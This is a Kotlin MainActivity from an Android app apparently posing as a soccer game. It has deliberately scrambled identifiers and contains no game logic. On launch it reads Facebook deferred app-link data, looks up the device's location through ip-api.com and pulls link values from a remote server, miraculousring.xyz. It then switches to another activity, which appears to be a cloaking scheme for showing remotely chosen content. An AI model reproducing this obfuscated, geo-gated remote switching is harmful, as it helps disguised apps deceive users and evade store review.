package com.generamobile.headsoccerl.cclclcododo

import android.content.Context
import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.facebook.applinks.AppLinkData
import com.generamobile.headsoccerl.amaaaain.Jifhurfhrfhfr
import com.generamobile.headsoccerl.apapapapap.ButterClassss
import com.generamobile.headsoccerl.apapapapap.ButterClassss.Companion.bvc
import com.generamobile.headsoccerl.apapapapap.ButterClassss.Companion.nhjkool
import com.generamobile.headsoccerl.databinding.ActivityMainBinding
import com.generamobile.headsoccerl.gtgthhy.Fil1Activity2
import com.orhanobut.hawk.Hawk
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {


    fun ujujuuju(hyjujun: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            hyjujun
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val opopopop = appLinkData.targetUri?.host.toString()
                Hawk.put(ButterClassss.gtyyhhj, opopopop)
            }
            if (appLinkData == null) {

            }
        }
    }

    private fun gtgyhyhy5() {
        val hyjuujuj = Intent(this@MainActivity, Fil1Activity2::class.java)
        startActivity(hyjuujuj)
        finish()
    }

    private suspend fun getDataDev() {

        val hyjuujjhbb = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://miraculousring.xyz/")
            .build()
            .create(Jifhurfhrfhfr::class.java)
        val linkViewfrgtt = hyjuujjhbb.njjkiik().body()?.ukilool.toString()
        val frfgtgt = hyjuujjhbb.njjkiik().body()?.yhyhyjujuuj.toString()
        val frgtt = hyjuujjhbb.njjkiik().body()?.mjmkikiklo.toString()


        Hawk.put(ButterClassss.hyjuii, linkViewfrgtt)
        Hawk.put(ButterClassss.nhmj, frfgtgt)
        Hawk.put(nhjkool, frgtt)


    }


    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        hyjuujuj = ActivityMainBinding.inflate(layoutInflater)
        setContentView(hyjuujuj.root)

        ujujuuju(this)

        val gttgt = Executors.newSingleThreadScheduledExecutor()
        var gtthhy: String? = Hawk.get(bvc, null)
        var gthyhhy: String? = Hawk.get(nhjkool, null)
        gttgt.scheduleAtFixedRate({
            if (gtthhy != null && gthyhhy != null) {
                gttgt.shutdown()
                gtgyhyhy5()
            } else {
                gtthhy = Hawk.get(bvc)
                gthyhhy = Hawk.get(nhjkool)
            }
        }, 0, 1, TimeUnit.SECONDS)

        GlobalScope.launch(Dispatchers.IO) {
            gtgtjitgijtgi
        }
    }

    private lateinit var hyjuujuj: ActivityMainBinding

    private suspend fun gtiojvjgtitggt() {
        val gtbkmhjhiyjyhi = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(Jifhurfhrfhfr::class.java)
        val gthyyy = gtbkmhjhiyjyhi.hyjuujujgvb().body()?.ololololo

        Hawk.put(bvc, gthyyy)
    }

    private val gtgtjitgijtgi: Job = GlobalScope.launch(Dispatchers.IO) {
        gtiojvjgtitggt()
        getDataDev()
    }


}